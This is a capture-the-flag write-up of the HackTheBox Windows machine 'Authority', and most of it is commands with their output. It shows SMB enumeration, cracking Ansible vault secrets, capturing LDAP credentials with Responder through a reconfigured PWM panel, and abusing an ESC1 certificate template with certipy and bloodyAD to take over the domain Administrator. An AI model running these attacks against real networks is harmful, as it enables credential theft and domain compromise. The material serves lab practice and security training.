---
layout: post
title:  "[HTB] Authority"
categories: [Machines]
description: Medium Windows
tags: [hackthebox, windows, medium]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/e6257bbacb2ddd56f5703bb61eadd8cb.png
---


TARGET_IP: 10.129.229.56 \\
ATTACKER_IP: 10.10.16.99


```
exegol-Authority /workspace # rustscan --addresses "10.129.229.56" -- -sV -Pn -sC 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-13 23:32:16Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt syn-ack ttl 127
| Issuer: commonName=172.16.2.118
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59458/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59471/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64618/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 5733/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 22874/udp): CLEAN (Timeout)
|   Check 4 (port 45641/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2026-02-13T23:33:12
|_  start_date: N/A
```


We can see some interesting services.  
On the port 8443, there is a web application named PWM, which will be useful later.  
Let's focus on the SMB service for now. 


```
exegol-Authority /workspace # nxc smb 10.129.229.56 --generate-hosts-file /etc/hosts
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
[Feb 13, 2026 - 20:42:45 (CET)] exegol-Authority /workspace # nxc smb 10.129.229.56 -u 'Guest' -p '' --shares       
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\Guest: 
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares                 
SMB         10.129.229.56   445    AUTHORITY        Development     READ            
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share 
```


Login as Guest works, and we have access to a share named Development. Let's take a look at it. \\

```
exegol-Authority /workspace # smbclientng -d 'authority.htb' -u 'Guest'  --host '10.129.229.56' 
               _          _ _            _
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v3.0.0  |___/
    
  | Provide a password for 'authority.htb\Guest': 
[+] Successfully authenticated to '10.129.229.56' as 'authority.htb\Guest'!

■[\\10.129.229.56\]> use Development
■[\\10.129.229.56\Development\]> cd Automation/Ansible
■[\\10.129.229.56\Development\Automation\Ansible\]> tree .
├── ADCS/
│   ├── defaults/
│   │   └── main.yml
│   ├── meta/
│   │   ├── main.yml
│   │   └── preferences.yml
│   ├── molecule/
│   │   └── default/
│   │       ├── converge.yml
│   │       ├── molecule.yml
│   │       └── prepare.yml
│   ├── tasks/
│   │   ├── assert.yml
│   │   ├── generate_ca_certs.yml
│   │   ├── init_ca.yml
│   │   ├── main.yml
│   │   └── requests.yml
│   ├── templates/
│   │   ├── extensions.cnf.j2
│   │   └── openssl.cnf.j2
│   ├── vars/
│   │   └── main.yml
│   ├── .ansible-lint
│   ├── .yamllint
│   ├── LICENSE
│   ├── README.md
│   ├── requirements.txt
│   ├── requirements.yml
│   ├── SECURITY.md
│   └── tox.ini
├── LDAP/
│   ├── .bin/
│   │   ├── clean_vault
│   │   ├── diff_vault
│   │   └── smudge_vault
│   ├── defaults/
│   │   └── main.yml
│   ├── files/
│   │   └── pam_mkhomedir
│   ├── handlers/
│   │   └── main.yml
│   ├── meta/
│   │   └── main.yml
│   ├── tasks/
│   │   └── main.yml
│   ├── templates/
│   │   ├── ldap_sudo_groups.j2
│   │   ├── ldap_sudo_users.j2
│   │   ├── sssd.conf.j2
│   │   └── sudo_group.j2
│   ├── vars/
│   │   ├── debian.yml
│   │   ├── main.yml
│   │   ├── redhat.yml
│   │   └── ubuntu-14.04.yml
│   ├── .travis.yml
│   ├── README.md
│   ├── TODO.md
│   └── Vagrantfile
├── PWM/
│   ├── defaults/
│   │   └── main.yml
│   ├── handlers/
│   │   └── main.yml
│   ├── meta/
│   │   └── main.yml
│   ├── tasks/
│   │   └── main.yml
│   ├── templates/
│   │   ├── context.xml.j2
│   │   └── tomcat-users.xml.j2
│   ├── ansible.cfg
│   ├── ansible_inventory
│   └── README.md
└── SHARE/
    └── tasks/
        └── main.yml
```

There are several files that might be of interest. After looking at all of them I found this : 

```yml
# PWM/defaults/main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

Those are ansible vaults, using ansible2john.py we can try to crack them. 

```
exegol-Authority /workspace # echo '$ANSIBLE_VAULT;1.1;AES256                             
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438' > vault0

exegol-Authority /workspace # ansible2john.py vault0 > ansible.hash

exegol-Authority /workspace # john --wordlist=/opt/lists/rockyou.txt ansible.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 SSE2 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
!@#$%^&*         (vault0)     
1g 0:00:00:10 DONE (2026-02-13 20:55) 0.09191g/s 3661p/s 3661c/s 3661C/s 051106..teamokaty
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We found the vault password, we can now read the credentials.

```
exegol-Authority /workspace # ansible-vault view vault0
Vault password:
svc_pwm

exegol-Authority /workspace # ansible-vault view vault1
Vault password:
pWm_@dm!N_!23
     
exegol-Authority /workspace # ansible-vault view vault2
Vault password:
DevT3st@123
```

We can't login as `svc_pwm` on the AD, but we remember that PWM is the name of the web application on port 8443.

![PWM](/assets/images/authority/1.png)

After trying to login with the creds we found we got an error. 

![PWM Login error](/assets/images/authority/2.png)

It seems that the LDAPS connection doesn't works. Let's try the others features. 


![PWM config](/assets/images/authority/3.png)

Using the password `pWm_@dm!N_!23` that we found earlier, we can login to the configuration panel. We can now replace the old LDAPS address with my address.

![PWM ldap](/assets/images/authority/4.png)

We can now initiate a connection and retrieve the credentials with responder. 

```
exegol-Authority /workspace # responder -I tun0
<SNIP...>
[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Now that we have valid credentials, we can use BloodHound to look at the domain. 


```
exegol-Authority /workspace # nxc ldap 'authority.htb' -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --dns-tcp --dns-server '10.129.229.56' --bloodhound -c All
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
LDAP        10.129.229.56   389    AUTHORITY        Resolved collection methods: rdp, group, acl, dcom, objectprops, psremote, container, session, trusts, localadmin
LDAP        10.129.229.56   389    AUTHORITY        Done in 0M 10S
LDAP        10.129.229.56   389    AUTHORITY        Compressing output into /root/.nxc/logs/AUTHORITY_10.129.229.56_2026-02-13_215934_bloodhound.zip
```

![BloodHound RM](/assets/images/authority/5.png)

`svc_ldap` is in the `Remote Management Users` group, so we can connect to the computer. 

```
exegol-Authority /workspace # evil-winrm -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -i 'authority.htb'
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> ls


    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/13/2026   6:30 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> cat user.txt
5fed[REDACTED]
```

![BloodHound ADCS](/assets/images/authority/6.png)

This user is also in the `Certificate Service DCOM Access` group, so we can look at the ADCS. 

```
exegol-Authority /workspace # certipy find \
    -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' \
    -dc-ip '10.129.229.56' -text \
    -enabled -hide-admins
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260213221006_Certipy.txt'
[*] Wrote text output to '20260213221006_Certipy.txt'


exegol-Authority /workspace # cat 20260213221006_Certipy.txt 

<SNIP...>
  1
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

The certificate template CorpVPN is vulnerable to ESC1, so any member of the `Domain Computers` would be able to pwn the domain. 
We don't control any computer's account, but we have the permission to create one. 

```
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We can do this using BloodyAD. 

```
exegol-Authority /workspace # bloodyAD --host authority.htb -d authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' add computer 'ATTACK' 'Password123'
[+] ATTACK$ created
```

Now we have everything to exploit ESC1. 

```
exegol-Authority /workspace # certipy req \
    -u 'attack$@authority.htb' -p 'Password123' \
    -dc-ip '10.129.229.56' -target 'authority.authority.htb' \
    -ca 'AUTHORITY-CA' -template 'CorpVPN' \
    -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate object SID is 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

exegol-Authority /workspace # certipy auth -pfx 'administrator.pfx' -dc-ip 10.129.229.56
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

Generating a TGT doesn't work, so we can just edit the Administrator password using certipy's `-ldap-shell` option.

```
exegol-Authority /workspace # certipy auth -pfx 'administrator.pfx' -dc-ip 10.129.229.56 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
Type help for list of commands


# change_password Administrator Password123
Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
Attempting to set new password of: Password123
Password changed successfully!
```

We can now connect to the DC as administrator. 

```
exegol-Authority /workspace # evil-winrm -u 'Administrator' -p 'Password123' -i 'authority.htb'
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/13/2026   6:30 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c144[REDACTED]
```
